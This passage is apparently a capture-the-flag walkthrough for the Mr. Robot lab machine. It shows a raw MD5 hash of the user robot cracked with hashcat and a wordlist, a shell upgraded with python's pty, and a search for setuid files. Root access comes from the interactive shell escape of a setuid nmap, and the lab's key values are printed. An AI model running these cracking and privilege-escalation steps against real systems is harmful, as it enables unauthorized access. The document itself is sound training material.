libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
mysql:x:1001:1001::/home/mysql:
varnish:x:999:999::/home/varnish:
robot:x:1002:1002::/home/robot:
$

$ dpkg --get-selections | grep deinstall
$

$ ls -l /home
total 4
drwxr-xr-x 2 root root 4096 Nov 13  2015 robot

I can read robot's home directory.

$ ls -l /home/robot
total 8
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
$

And I can read the password.raw-md5 file.

$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

root@kali:~/mrrobot# hashcat -m 0 ~/mrrobot/robot_hash /usr/share/wordlists/rockyou.txt --force
hashcat (v3.5.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-4870HQ CPU @ 2.50GHz, 1489/1489 MB allocatable, 4MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Precompute-Init
* Precompute-Merkle-Demgard
* Meet-In-The-Middle
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.
Watchdog: Temperature retain trigger disabled.

* Device #1: build_opts '-I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D VECT_SIZE=4 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=0 -D unroll -cl-std=CL1.2
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14343297

- Device #1: autotuned kernel-accel to 1024               
- Device #1: autotuned kernel-loops to 1
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyzs]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit =>

Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
Time.Started.....: Sat May 20 21:06:40 2017 (0 secs)
Time.Estimated...: Sat May 20 21:06:40 2017 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:  5554.7 kH/s (0.57ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 40961/14343297 (0.29%)
Rejected.........: 1/40961 (0.00%)
Restore.Point....: 36865/14343297 (0.26%)
Candidates.#1....: hockey5 -> loser69
HWMon.Dev.#1.....: N/A

Started: Sat May 20 21:06:32 2017
Stopped: Sat May 20 21:06:41 2017
root@kali:~/mrrobot#

is our password abcdefghijklmnopqrstuvwxyz?

$ python -c 'import pty;pty.spawn("/bin/bash")'
daemon@linux:/home/robot$ ssuu  rroobboott

Password: abcdefghijklmnopqrstuvwxyz

Stop it terminal echo!!

robot@linux:~$ stty -echostty -echo

Better :)

robot@linux:~$ cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
robot@linux:~$

robot@linux:~$ sudo -l
[sudo] password for robot: abcdefghijklmnopqrstuvwxyz

Sorry, user robot may not run sudo on linux.
robot@linux:~$

Always check for the easy stuff.

robot@linux:/opt/bitnami/apps/wordpress/conf$ find / -user root -perm -4000 -print
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown

nmap sticks out as the strange one....

robot@linux:/tmp$ nmap localhost

Starting nmap 3.81 ( http://www.insecure.org/nmap/ ) at 2017-05-21 03:40 UTC
Interesting ports on localhost (127.0.0.1):
(The 1659 ports scanned but not shown below are in state: closed)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql

Nmap finished: 1 IP address (1 host up) scanned in 0.117 seconds
robot@linux:/tmp$

mysql showing up was expected, ftp was not.

quick googling showed nmap interactive mode.

robot@linux:/tmp$ nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# whoami
root

# cd /root
# ls -l
total 4
-rw-r--r-- 1 root root  0 Nov 13  2015 firstboot_done
-r-------- 1 root root 33 Nov 13  2015 key-3-of-3.txt
# cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4

I'll leave ftp on my bucket list.  It doesn't feel like they planned on me using nmap in that way, i think they wanted me to find ftp.
